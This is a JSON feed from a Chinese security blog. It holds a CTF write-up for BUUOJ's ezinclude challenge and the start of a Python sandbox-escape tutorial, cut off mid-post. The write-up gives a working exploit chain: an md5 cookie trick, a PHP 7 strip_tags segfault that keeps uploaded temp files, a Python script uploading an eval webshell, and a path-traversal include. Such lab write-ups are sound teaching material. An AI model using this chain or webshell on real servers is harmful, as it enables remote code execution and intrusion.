{
    "version": "https://jsonfeed.org/version/1",
    "title": "golden的部落阁 • All posts by \"web\" tag",
    "description": "golden的部落阁",
    "home_page_url": "http://blog.g01den.top",
    "items": [
        {
            "id": "http://blog.g01den.top/posts/b3ad4123.html",
            "url": "http://blog.g01den.top/posts/b3ad4123.html",
            "title": "有小考点的Web题",
            "date_published": "2025-10-27T14:38:34.000Z",
            "content_html": "<h1 id=\"buuoj-npuctf2020ezinclude-1\"><a class=\"markdownIt-Anchor\" href=\"#buuoj-npuctf2020ezinclude-1\">#</a> BUUOJ-[NPUCTF2020]ezinclude 1</h1>\n<h2 id=\"涉及的知识点\"><a class=\"markdownIt-Anchor\" href=\"#涉及的知识点\">#</a> 涉及的知识点</h2>\n<ul>\n<li>文件上传时的临时文件</li>\n<li>php7 文件上传时  <code>Segment Fault</code> ，上传的临时文件不会被删除</li>\n<li>绕过 <code>disable_functions</code></li>\n</ul>\n<h2 id=\"解题过程\"><a class=\"markdownIt-Anchor\" href=\"#解题过程\">#</a> 解题过程</h2>\n<p>​\t扫个目录，存在 <code>index.php</code> 、 <code>dir.php</code> 、 <code>404.html</code></p>\n<p>​\t <code>404.html</code>  没啥用，先看 <code>dir.php</code> ，好像获取目录内文件的，但是不知道是什么地方的，之后看看。</p>\n<p>​\t <code>index.php</code>  抓个包：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>openresty</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Mon, 27 Oct 2025 14:20:37 GMT</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>73</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">X-Powered-By</span><span class=\"punctuation\">: </span>PHP/7.0.33</span><br><span class=\"line\"><span class=\"attribute\">Set-Cookie</span><span class=\"punctuation\">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a; expires=Mon, 08-Dec-2025 06:20:37 GMT; Max-Age=3600000</span><br><span class=\"line\"><span class=\"attribute\">Vary</span><span class=\"punctuation\">: </span>Accept-Encoding</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span><span class=\"punctuation\">: </span>no-cache</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-xquery\">username/password<span class=\"built_in\"> error</span><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-xquery\"><span class=\"comment\">&lt;!--md5($secret.$name)===$pass --&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-xquery\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xquery\"></span></span><br></pre></td></tr></table></figure>\n<p>​\t看到 <code>&lt;!--md5($secret.$name)===$pass --&gt;</code>  提示</p>\n<blockquote>\n<ul>\n<li><code>Set-Cookie</code>  中的 <code>Hash</code>  就是 <code>$md5($secret.$name)</code> （经典脑洞）</li>\n<li>如果 <code>$name=''</code> ，则有 <code>$md5($secret.$name)===$md5($secret)===上面的Hash</code></li>\n<li>则 <code>/?pass=上面的Hash</code>  即可，或者带上 <code>&amp;name=</code>  传递空值</li>\n</ul>\n</blockquote>\n<p>​\t这里是个脑洞，不知道怎么写，大神的博客里的解法是这样的，之后访问 get 传参 pass 为 hash 的值：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/?pass=fa25e54758d5d5c1927781a6ede89f8a</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>0ab02601-d4bd-4e33-94da-895a0ac553e6.node5.buuoj.cn:81</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span><span class=\"punctuation\">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">Priority</span><span class=\"punctuation\">: </span>u=0, i</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t得到回显：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>openresty</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Mon, 27 Oct 2025 14:23:02 GMT</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>165</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">X-Powered-By</span><span class=\"punctuation\">: </span>PHP/7.0.33</span><br><span class=\"line\"><span class=\"attribute\">Vary</span><span class=\"punctuation\">: </span>Accept-Encoding</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span><span class=\"punctuation\">: </span>no-cache</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;javascript&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"language-javascript\"></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">           <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;flflflflag.php&quot;</span>;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"comment\">&lt;!--md5($secret.$name)===$pass --&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"></span></span><br></pre></td></tr></table></figure>\n<p>​\t访问 <code>flflflflag.php</code> ，会 302，butp 重放：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>openresty</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Mon, 27 Oct 2025 14:24:50 GMT</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>241</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">X-Powered-By</span><span class=\"punctuation\">: </span>PHP/7.0.33</span><br><span class=\"line\"><span class=\"attribute\">Vary</span><span class=\"punctuation\">: </span>Accept-Encoding</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span><span class=\"punctuation\">: </span>no-cache</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;javascript&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"language-javascript\"></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">           <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;404.html&quot;</span>;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">include($_GET[&quot;file&quot;])<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"></span></span><br></pre></td></tr></table></figure>\n<p>​\t\t提示文件包含，读下相关文件 <code>index.php</code> ：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;javascript&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">           <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;404.html&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"meta\">$file=$_GET[&#x27;file&#x27;];</span></span><br><span class=\"line\"><span class=\"meta\">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span></span><br><span class=\"line\"><span class=\"meta\">\tdie(&#x27;nonono&#x27;);</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"><span class=\"meta\">@include($file);</span></span><br><span class=\"line\"><span class=\"meta\">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t发现 data，input，zip 三个伪协议被杨了。</p>\n<p>​\t\t读一下 <code>dir.php</code> ：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">scandir</span>(<span class=\"string\">&#x27;/tmp&#x27;</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t是读取的临时文件，之前说过了，</p>\n<blockquote>\n<p>php7 文件上传时  <code>Segment Fault</code> ，上传的临时文件不会被删除</p>\n<p><strong>这里需要用到一个特性</strong>，在上传文件时，如果出现 <code>Segment Fault</code> ，那么上传的临时文件不会被删除。这里的上传文件需要说明一下，一般认为，上传文件需要对应的功能点，但实际上，无论是否有文件上传的功能点，只要 HTTP 请求中存在文件，那么就会被保存为临时文件，当前 HTTP 请求处理完成后，垃圾回收机制会自动删除临时文件。</p>\n<p>使 <code>php</code>  陷入死循环直，产生 <code>Segment Fault</code>  的方法：（具体原理未找到，如果有大佬清楚，请告知，感谢。）</p>\n<ul>\n<li>使用</li>\n</ul>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/string.strip_tags/resource=文件</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>版本要求：</p>\n<ul>\n<li><code>php7.0.0-7.1.2</code></li>\n<li><code>php7.1.3-7.2.1</code></li>\n<li><code>php7.2.2-7.2.8</code></li>\n</ul>\n</li>\n<li>\n<p>使用</p>\n</li>\n</ul>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/convert.quoted-printable-encode/resource=文件</span><br></pre></td></tr></table></figure>\n<ul>\n<li>版本要求：\n<ul>\n<li><code>php&lt;=5.6.38</code></li>\n<li><code>php7.0.0-7.0.32</code></li>\n<li><code>php7.0.4-7.2.12</code></li>\n</ul>\n</li>\n<li>函数要求\n<ul>\n<li><code>file</code></li>\n<li><code>file_get_contents</code></li>\n<li><code>readfile</code></li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<p>​\t\t这个时候直接用下面这个代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://0f5a7ab3-e7a9-44aa-82ec-fc6ee05919ff.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class=\"line\">payload = <span class=\"string\">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class=\"line\">file_data = &#123;<span class=\"string\">&quot;file&quot;</span>: BytesIO(payload.encode())&#125;</span><br><span class=\"line\">res = requests.post(url=url,files=file_data, allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>存储路径，由</li>\n</ul>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php.ini</span><br></pre></td></tr></table></figure>\n<p>中的</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upload_tmp_dir</span><br></pre></td></tr></table></figure>\n<p>指定，</p>\n<ul>\n<li>\n<p>linux 下默认值 <code>/tmp/</code></p>\n</li>\n<li>\n<p>windwos 下默认值 <code>C:/Windwos</code>  or  <code>C:/Windwos/Temp/</code></p>\n</li>\n<li>\n<p>命名规则</p>\n</li>\n<li>\n<p>linux 下， <code>php+6个随机字符</code></p>\n</li>\n<li>\n<p>windows 下， <code>php+4个随机字符.tmp</code></p>\n</li>\n<li>\n<p>生命周期</p>\n</li>\n<li>\n<p>开始处理带有文件的 <code>POST</code>  请求</p>\n</li>\n<li>\n<p>保存临时文件，并写入数据</p>\n</li>\n<li>\n<p>执行 <code>php</code>  脚本</p>\n</li>\n<li>\n<p>删除临时文件</p>\n</li>\n</ul>\n</blockquote>\n<p>​\t\t这里可以直接访问 <code>dir.php</code>  获得文件名。</p>\n<p>​\t\t之后通过 flflflflag.php 进行临时文件包含即可：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/flflflflag.php?file=../../../tmp/php7nXFiI</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>0ab02601-d4bd-4e33-94da-895a0ac553e6.node5.buuoj.cn:81</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span><span class=\"punctuation\">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">Priority</span><span class=\"punctuation\">: </span>u=0, i</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>14</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-abnf\"><span class=\"attribute\">cmd</span><span class=\"operator\">=</span>phpinfo()<span class=\"comment\">;</span></span></span><br></pre></td></tr></table></figure>\n<p>​\t\tflag 在 phpinfo 里。</p>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/2d792864.html",
            "url": "http://blog.g01den.top/posts/2d792864.html",
            "title": "Python栈帧逃逸",
            "date_published": "2025-09-13T14:05:07.000Z",
            "content_html": "<h1 id=\"python栈帧逃逸\"><a class=\"markdownIt-Anchor\" href=\"#python栈帧逃逸\">#</a> Python 栈帧逃逸：</h1>\n<h2 id=\"1-yield-语与生成器函数\"><a class=\"markdownIt-Anchor\" href=\"#1-yield-语与生成器函数\">#</a> 1、yield 语与生成器函数：</h2>\n<p>​\t\tpython 中的 yield 语句用于定义生成器函数，它能让函数在运行过程中暂停并保存当前状态，后续再恢复执行。</p>\n<p>​\t\t生成器 是  Pythonn 中一种特殊的迭代器，它可以在迭代过程中动态生成值，而不需要一次性将所有值存 0 储在内存中。</p>\n<p>​\t\t举个生成器的例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;生成器函数第一次执行&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;生成器函数第二次执行&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;生成器函数第三次执行&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gen = func()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">next</span>(gen))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">next</span>(gen))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">next</span>(gen))</span><br><span class=\"line\"><span class=\"comment\"># frame = [x for x in gen]</span></span><br><span class=\"line\"><span class=\"comment\"># print(frame)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#执行结果</span></span><br><span class=\"line\"><span class=\"comment\">#生成器函数第一次执行</span></span><br><span class=\"line\"><span class=\"comment\">#1</span></span><br><span class=\"line\"><span class=\"comment\">#生成器函数第二次执行</span></span><br><span class=\"line\"><span class=\"comment\">#2</span></span><br><span class=\"line\"><span class=\"comment\">#生成器函数第三次执行</span></span><br><span class=\"line\"><span class=\"comment\">#3</span></span><br></pre></td></tr></table></figure>\n<p>​\t或者：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>():</span><br><span class=\"line\">    a = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> a</span><br><span class=\"line\">        a += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">f = f()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">next</span>(f))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">next</span>(f))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#执行结果</span></span><br><span class=\"line\"><span class=\"comment\">#1</span></span><br><span class=\"line\"><span class=\"comment\">#2</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t\t也可以 遍历获取所有的自增值：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>():</span><br><span class=\"line\">    a = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> a</span><br><span class=\"line\">        a += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">f = f()</span><br><span class=\"line\"><span class=\"keyword\">for</span> value <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(value)</span><br><span class=\"line\">    </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">#会正常输出1到19</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"2-生成器表达式\"><a class=\"markdownIt-Anchor\" href=\"#2-生成器表达式\">#</a> 2、生成器表达式：</h2>\n<p>​\t\t生成器表达式是一种在 Python 中创建生成器的紧凑形式。类似于列表推导式，生成器表达式允许你使用简洁的语法来定义生成器，而不必显示地编写一个函数。生成器表达式的 语法与列表推导式类似，但是使用圆括号而不是方括号。生成器表达式会 逐个生成值，而不是一次性生成 整个序列。。这有利于 提高内存的额 利用率：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span 